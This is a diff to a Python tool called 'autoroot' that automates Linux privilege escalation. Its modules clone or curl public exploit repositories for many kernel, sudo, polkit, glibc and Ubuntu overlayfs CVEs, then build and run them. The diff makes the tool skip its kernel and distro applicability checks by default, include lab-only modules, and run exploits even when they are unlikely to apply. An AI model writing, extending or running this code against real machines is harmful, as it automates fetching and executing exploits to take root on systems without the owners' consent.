@@ -42,6 +42,7 @@ import urllib.request
 
 COLOR = sys.stdout.isatty()
 VERBOSE = False
+FORCE = True
 CAPTURE = None
 
 BANNER = r"""
@@ -393,6 +394,8 @@ def kernel_tuple():
 
 
 def in_kernel_range(low, high) -> bool:
+    if FORCE:
+        return True
     return low <= kernel_tuple() <= high
 
 
@@ -411,6 +414,10 @@ def os_release() -> dict:
 
 def distro_id() -> str:
     return os_release().get("ID", "").lower()
+
+
+def distro_ok(*ids) -> bool:
+    return FORCE or distro_id() in ids
 
 
 def has_suid(path):
@@ -493,7 +500,7 @@ def m_dirtypipe():
     if not in_kernel_range((5, 8), (5, 16)):
         log(warn(f"      kernel {platform.release()} aralikta degil"))
         return False
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git dirtypipe", "clone")
@@ -504,7 +511,7 @@ def m_dirtypipe():
 
 @module("gameover", "GameOver(lay) (CVE-2023-2640/32629)", "Ubuntu + OverlayFS")
 def m_gameover():
-    if distro_id() not in ("ubuntu", "linuxmint"):
+    if not distro_ok("ubuntu", "linuxmint"):
         log(warn(f"      distro {distro_id() or 'unknown'} uygun degil"))
         return False
     sh("curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh", "download")
@@ -522,7 +529,7 @@ def m_overlayfs():
     if "overlay" not in fs:
         log(warn("      overlayfs yok"))
         return False
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/xkaneiki/CVE-2023-0386.git overlayfs", "clone")
@@ -536,7 +543,7 @@ def m_dirtyfrag():
     if not in_kernel_range((6, 1), (6, 6)):
         log(warn(f"      kernel {platform.release()} aralikta degil"))
         return False
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/V4bel/dirtyfrag.git dirtyfrag", "clone")
@@ -550,7 +557,7 @@ def m_fragnesia():
     if not in_kernel_range((5, 19), (6, 8)):
         log(warn(f"      kernel {platform.release()} aralikta degil"))
         return False
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/v12-security/pocs.git pocs", "clone")
@@ -565,9 +572,6 @@ def m_packagekit():
     if not packagekit_present():
         log(warn("      PackageKit yok"))
         return False
-    if not have("git"):
-        log(warn("      git yok"))
-        return False
     sh("git clone --depth 1 https://github.com/Vozec/CVE-2026-41651.git pk", "clone")
     d = os.path.join(WORK, "pk")
     sh("chmod +x cve-2026-41651", "chmod", cwd=d)
@@ -579,9 +583,6 @@ def m_packagekit():
 def m_ovswrap():
     if not openvswitch_present():
         log(warn("      Open vSwitch yok"))
-        return False
-    if not have("git"):
-        log(warn("      git yok"))
         return False
     sh("git clone --depth 1 https://github.com/manizada/OVSwrap.git ovswrap", "clone")
     sh("python3 ovswrap-poc.py", "run", cwd=os.path.join(WORK, "ovswrap"))
@@ -859,7 +860,7 @@ def m_baron():
     if not re.search(r"1\.(8\.|9\.[0-5])", version):
         log(warn("      sudo version not in the vulnerable range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/blasty/CVE-2021-3156.git baron", "clone")
     d = os.path.join(WORK, "baron")
@@ -884,7 +885,7 @@ def m_polkit():
 def m_looney():
     version = capture("ldd --version 2>/dev/null | head -1")
     log(f"      {version or 'glibc unknown'}")
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         return False
     sh("git clone --depth 1 https://github.com/leesh3288/CVE-2023-4911.git looney", "clone")
     d = os.path.join(WORK, "looney")
@@ -898,7 +899,7 @@ def m_nft():
     if not in_kernel_range((5, 14), (6, 6)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/Notselwyn/CVE-2024-1086.git nft1086", "clone")
     d = os.path.join(WORK, "nft1086")
@@ -912,7 +913,7 @@ def m_22555():
     if not in_kernel_range((2, 6), (5, 12)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/google/security-research.git gsr", "clone")
     d = os.path.join(WORK, "gsr", "pocs", "linux", "cve-2021-22555")
@@ -926,10 +927,10 @@ def m_22555():
 
 @module("cve_2021_3493", "Ubuntu overlayfs (CVE-2021-3493)", "Ubuntu kernel")
 def m_3493():
-    if distro_id() not in ("ubuntu", "linuxmint"):
+    if not distro_ok("ubuntu", "linuxmint"):
         log(warn("      not Ubuntu"))
         return False
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         return False
     sh("git clone --depth 1 https://github.com/briskets/CVE-2021-3493.git cve3493", "clone")
     d = os.path.join(WORK, "cve3493")
@@ -943,7 +944,7 @@ def m_0185():
     if not in_kernel_range((5, 4), (5, 16)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/Crusaders-of-Rust/CVE-2022-0185.git cve0185", "clone")
     d = os.path.join(WORK, "cve0185")
@@ -957,7 +958,7 @@ def m_2588():
     if not in_kernel_range((5, 8), (5, 19)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/Markakd/CVE-2022-2588.git cve2588", "clone")
     d = os.path.join(WORK, "cve2588")
@@ -970,9 +971,6 @@ def m_2588():
 def m_8835():
     if not in_kernel_range((5, 4), (5, 6)):
         log(warn(f"      kernel {platform.release()} outside range"))
-        return False
-    if not have("git"):
-        log(warn("      git missing"))
         return False
     sh("git clone --depth 1 https://github.com/snappyJack/Rick_write_exp_CVE-2020-8835.git cve8835", "clone")
     d = os.path.join(WORK, "cve8835", "hijack_prctl", "exp")
@@ -990,8 +988,6 @@ def m_1015():
     if not in_kernel_range((5, 12), (5, 16)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git"):
-        return False
     sh("git clone --depth 1 https://github.com/pqlx/CVE-2022-1015.git cve1015", "clone")
     d = os.path.join(WORK, "cve1015")
     sh("make", "make (needs libmnl/libnftnl)", cwd=d)
@@ -1003,8 +999,6 @@ def m_1015():
 def m_0179():
     if not in_kernel_range((5, 5), (6, 2)):
         log(warn(f"      kernel {platform.release()} outside range"))
-        return False
-    if not have("git"):
         return False
     sh("git clone --depth 1 https://github.com/TurtleARM/CVE-2023-0179-PoC.git cve0179", "clone")
     d = os.path.join(WORK, "cve0179")
@@ -1018,7 +1012,7 @@ def m_0582():
     if not in_kernel_range((6, 4), (6, 7)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         return False
     sh("git clone --depth 1 https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582.git cve0582", "clone")
     d = os.path.join(WORK, "cve0582")
@@ -1031,7 +1025,7 @@ def m_0582():
 def m_22809():
     version = capture("sudo -V 2>/dev/null | head -1")
     log(f"      {version or 'sudo unknown'}")
-    if not have("git") or not version:
+    if not version:
         return False
     sh("git clone --depth 1 https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc.git cve22809", "clone")
     d = os.path.join(WORK, "cve22809")
@@ -1044,8 +1038,6 @@ def m_48990():
     if "needrestart" not in capture("dpkg -l 2>/dev/null | grep -i needrestart", timeout=15):
         log(warn("      needrestart not installed"))
         return False
-    if not have("git"):
-        return False
     sh("git clone --depth 1 https://github.com/makuga01/CVE-2024-48990-PoC.git cve48990", "clone")
     d = os.path.join(WORK, "cve48990")
     sh("chmod +x start.sh; ./start.sh", "run", cwd=d)
@@ -1056,8 +1048,6 @@ def m_48990():
 def m_44731():
     if not shutil.which("snap-confine") and not os.path.exists("/usr/lib/snapd/snap-confine"):
         log(warn("      snap-confine not found"))
-        return False
-    if not have("git"):
         return False
     sh("git clone --depth 1 https://github.com/deeexcee-io/CVE-2021-44731-snap-confine-SUID.git cve44731", "clone")
     d = os.path.join(WORK, "cve44731")
@@ -1070,7 +1060,7 @@ def m_32233():
     if not in_kernel_range((6, 0), (6, 3)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not ensure_compiler():
+    if not ensure_compiler():
         return False
     sh("git clone --depth 1 https://github.com/Liuk3r/CVE-2023-32233.git cve32233", "clone")
     d = os.path.join(WORK, "cve32233")
@@ -1084,7 +1074,7 @@ def m_0995():
     if not in_kernel_range((5, 8), (5, 16)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/Bonfee/CVE-2022-0995.git cve0995", "clone")
     d = os.path.join(WORK, "cve0995")
@@ -1098,7 +1088,7 @@ def m_25636():
     if not in_kernel_range((5, 4), (5, 16)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/Bonfee/CVE-2022-25636.git cve25636", "clone")
     d = os.path.join(WORK, "cve25636")
@@ -1112,8 +1102,6 @@ def m_27666():
     if not in_kernel_range((5, 4), (5, 16)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git"):
-        return False
     sh("git clone --depth 1 https://github.com/plummm/CVE-2022-27666.git cve27666", "clone")
     d = os.path.join(WORK, "cve27666")
     sh("chmod +x compile.sh run.sh; ./compile.sh", "compile", cwd=d)
@@ -1126,8 +1114,6 @@ def m_4204():
     if not in_kernel_range((5, 4), (5, 15)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git"):
-        return False
     sh("git clone --depth 1 https://github.com/tr3ee/CVE-2021-4204.git cve4204", "clone")
     d = os.path.join(WORK, "cve4204")
     sh("chmod +x build_and_run.sh; sh build_and_run.sh", "run", cwd=d)
@@ -1139,7 +1125,7 @@ def m_23222():
     if not in_kernel_range((5, 8), (5, 16)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/tr3ee/CVE-2022-23222.git cve23222", "clone")
     d = os.path.join(WORK, "cve23222")
@@ -1153,7 +1139,7 @@ def m_3490():
     if not in_kernel_range((5, 8), (5, 11)):
         log(warn(f"      kernel {platform.release()} outside range"))
         return False
-    if not have("git") or not have("make"):
+    if not have("make"):
         return False
     sh("git clone --depth 1 https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490.git cve3490", "clone")
     d = os.path.join(WORK, "cve3490")
@@ -1266,8 +1252,13 @@ def run_module(mod: Module) -> None:
     captured = CAPTURE
     CAPTURE = None
     if applicable is False:
-        mod.skipped = True
-        mod.reason = _capture_reason(captured)
+        reason = _capture_reason(captured)
+        if FORCE:
+            mod.failed = True
+            mod.reason = reason
+        else:
+            mod.skipped = True
+            mod.reason = reason
         return
 
     log("")
@@ -1283,13 +1274,15 @@ def run_module(mod: Module) -> None:
 
 
 def main(argv=None) -> int:
-    global DRY, TIMEOUT, UNTRUSTED, WORK
+    global DRY, TIMEOUT, UNTRUSTED, WORK, FORCE
     p = argparse.ArgumentParser(
         description="autoroot - lab privilege-escalation runner")
     p.add_argument("--yes", "-y", action="store_true",
                    help="confirm running the modules")
     p.add_argument("--dry-run", action="store_true",
                    help="print commands without running them")
+    p.add_argument("--safe", action="store_true",
+                   help="honour kernel/distro checks (default: try anyway)")
     p.add_argument("--verbose", action="store_true",
                    help="show every command and detailed output")
     p.add_argument("--color", choices=("auto", "always", "never"),
@@ -1345,6 +1338,7 @@ def main(argv=None) -> int:
     DRY = args.dry_run
     TIMEOUT = args.timeout if args.timeout > 0 else 10 ** 9
     UNTRUSTED = args.allow_untrusted
+    FORCE = not args.safe
     WORK = find_workdir()
     os.chmod(WORK, 0o700)
     ensure_tools()
@@ -1357,7 +1351,7 @@ def main(argv=None) -> int:
     if not args.only:
         selected = [
             m for m in selected
-            if (args.labs or not m.lab)
+            if (args.labs or FORCE or not m.lab)
             and (args.allow_untrusted or not m.untrusted)
         ]
     high = {
@@ -1429,6 +1423,7 @@ def main(argv=None) -> int:
 
 if __name__ == "__main__":
     sys.exit(main())
+
 
 
 
